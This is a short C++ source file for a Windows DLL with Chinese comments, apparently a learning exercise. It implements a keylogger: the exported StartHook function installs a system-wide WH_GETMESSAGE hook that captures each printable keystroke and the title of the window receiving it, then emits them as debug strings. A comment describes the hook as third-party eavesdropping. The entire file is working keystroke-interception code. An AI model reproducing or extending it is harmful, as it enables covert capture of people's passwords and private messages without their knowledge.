// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"
#include<windows.h>
#include<iostream>

using namespace std;

HHOOK g_hHook = nullptr;
HINSTANCE g_hInstance = nullptr;
LRESULT CALLBACK MsgHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (HC_ACTION == nCode)//说明消息到来
	{
		PMSG pMsg = (PMSG)lParam;
		if (WM_CHAR == pMsg->message)
		{
			//确定此时已经按下了一个键
			char szKey = (char)pMsg->wParam;//获取用户按到的键有效字符消息在32-126之间
			//他自己本身没有窗口所以就算输出也看不到所以不能输出
			//cout << szKey << endl;
			if (szKey >= 32 && szKey <= 126)
			{
				char szWindowName[MAXBYTE] = { 0 };
				char szDebug[MAXBYTE] = { 0 };
				GetWindowTextA(pMsg->hwnd, szWindowName, MAXBYTE);//获取到窗口的句柄
				sprintf_s(szDebug, MAXBYTE, "窗口名字:%s接受到了:%c", szWindowName, szKey);
				OutputDebugStringA(szDebug);//在DLL里不实用GetLastError查看报错用这个
			}
		}
	}



	//监听回调函数，用户输入什么，返回给应用什么，起到第三方窃听
	return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}






extern "C"
_declspec(dllexport) BOOL StartHook()
{
	//回调函数，HOOK钩子
	g_hHook = SetWindowsHookEx(WH_GETMESSAGE, MsgHookProc, g_hInstance, NULL);
	if (nullptr == g_hHook)//当值为错误时
	{
		SetLastError(GetLastError());//获取错误码
		return FALSE;
	}
	return TRUE;
}



BOOL UnHook()
{
	if (g_hHook)
	{
		return UnhookWindowsHookEx(g_hHook);
	}
	return FALSE;
}
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH://当DLL被加载入进程时触发
		g_hInstance = hModule;
		break;
	case DLL_THREAD_ATTACH://当DLL被线程运行时触发
	case DLL_THREAD_DETACH://当DLL在线程中运行完成时触发
	case DLL_PROCESS_DETACH://当DLL被从进程中剥离的时候触发
		UnHook();
		break;
	}
	return TRUE;
}

